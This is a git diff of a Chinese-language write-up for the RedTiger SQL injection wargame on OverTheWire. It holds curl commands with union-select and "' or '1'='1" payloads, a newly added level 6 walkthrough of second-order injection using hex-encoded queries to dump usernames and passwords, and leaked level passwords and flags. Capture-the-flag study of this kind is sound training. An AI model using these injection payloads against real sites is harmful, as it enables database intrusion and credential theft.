@@ -579,14 +579,10 @@ Hornoxe
 thatwaseasy
 ```
 
-```
-curl "http://redtiger.labs.overthewire.org/level1.php?cat=1"%"20union"%"20select"%"201,2,username,password"%"20from"%"20level1_users" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" --compressed -H "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" -H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "Host: redtiger.labs.overthewire.org" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data ""
-```
-
 ## level2
 
 ```
-curl "http://redtiger.labs.overthewire.org/level2.php"-H "Connection: keep-alive" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" --data ""
+curl "http://redtiger.labs.overthewire.org/level2.php" -H "Cookie: level2login=4_is_not_random" 
 ```
 首先点击登陆按钮，抓取登陆数据包。有如下字段
 	
@@ -615,14 +611,10 @@ admin
 ' or '1'='1
 ```
 
-```
-curl "http://redtiger.labs.overthewire.org/level2.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug"  --data "username=1&password='+or+'1'='1&login=Login"
-```
-
 ## level3
 
 ```
-curl "http://redtiger.labs.overthewire.org/level3.php" -H "Host: redtiger.labs.overthewire.org" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2" --compressed -H "Referer: http://redtiger.labs.overthewire.org/level2.php" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "Connection: keep-alive" -H "Upgrade-Insecure-Requests: 1" --data  "password=feed_your_cat_before_your_cat_feeds_you&level3login=Hack+it"
+curl "http://redtiger.labs.overthewire.org/level3.php" -H "Cookie: level3login=feed_your_cat_before_your_cat_feeds_you" 
 ```
 
 
@@ -712,7 +704,7 @@ print '<br>';
 
 网站
 ```
-curl "https://redtiger.labs.overthewire.org/level4.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+curl "http://redtiger.labs.overthewire.org/level4.php" -H "Cookie: level4login=there_is_no_bug"
 ```
 
 	Welcome to Level 4
@@ -814,10 +806,6 @@ print 'result = ', result
 > You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa
 > The password for the next level is: there_is_a_truck
 
-```
-curl "http://redtiger.labs.overthewire.org/level5.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug"
-```
-
 ## level5
 
 > Target: Bypass the login
@@ -853,8 +841,62 @@ password=1
 ## level 6
 
 ```
-curl 'http://redtiger.labs.overthewire.org/level6.php?user=1' -H 'Cookie: level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7'
+curl 'http://redtiger.labs.overthewire.org/level6.php?user=1' -H 'Cookie:  level6login=for_more_bugs_update_to_php7'
 ```
+
+可以用常规注入对url参数 `user=1`进行注入测试。但是测试回显字段时，未回显。
+```
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23
+```
+报错
+	
+	User not found
+	Login failed! 
+
+而得到user的username为 `deddlef` 。
+```
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23
+```
+	
+	Username: 	deddlef
+	Email: 	dumbi@damibi.de
+
+可以用 `'deddlef'` 替换 `union select 1,2,3,4,5%23` 中的各个回显位置。还是报错。服务器应该过滤了 `'`。
+用16进制 `0x646564646c6566` 继续替换查找，当替换 `2` 时，得到正确的回显结果。
+那么可以怀疑后台先根据 `id` 查找 `username`，再根据 `username` 再次去查找 user信息的，我们可以利用 第二个回显位置进行进一步注入测试，但是要用16进制表示。
+**二次注入**
+
+```
+# 测试回显数量，仍然是5个位置。
+# ' order by 5# => 0x27206f72646572206279203523
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203523,3,4,5%23
+# ' order by 6# => 0x27206f72646572206279203623
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203623,3,4,5%23
+```
+测试回显位：
+```
+# ' union select 1,2,3,4,5# => 0x2720756e696f6e2073656c65637420312c322c332c342c3523
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%23
+```
+
+	Username: 	2
+	Email: 	4
+
+That's ez! 接下来按照要求输出即可。
+
+```
+# ' union select 1,username,3,password,5 from level6_users where status=1#   =>  0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123
+
+http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%23
+```
+
+> Username: 	admin
+> Email: 	m0nsterk1ll
+> You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932
+> The password for the next level is: keep_in_mind_im_not_blind
+
+## level 7
+
 
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
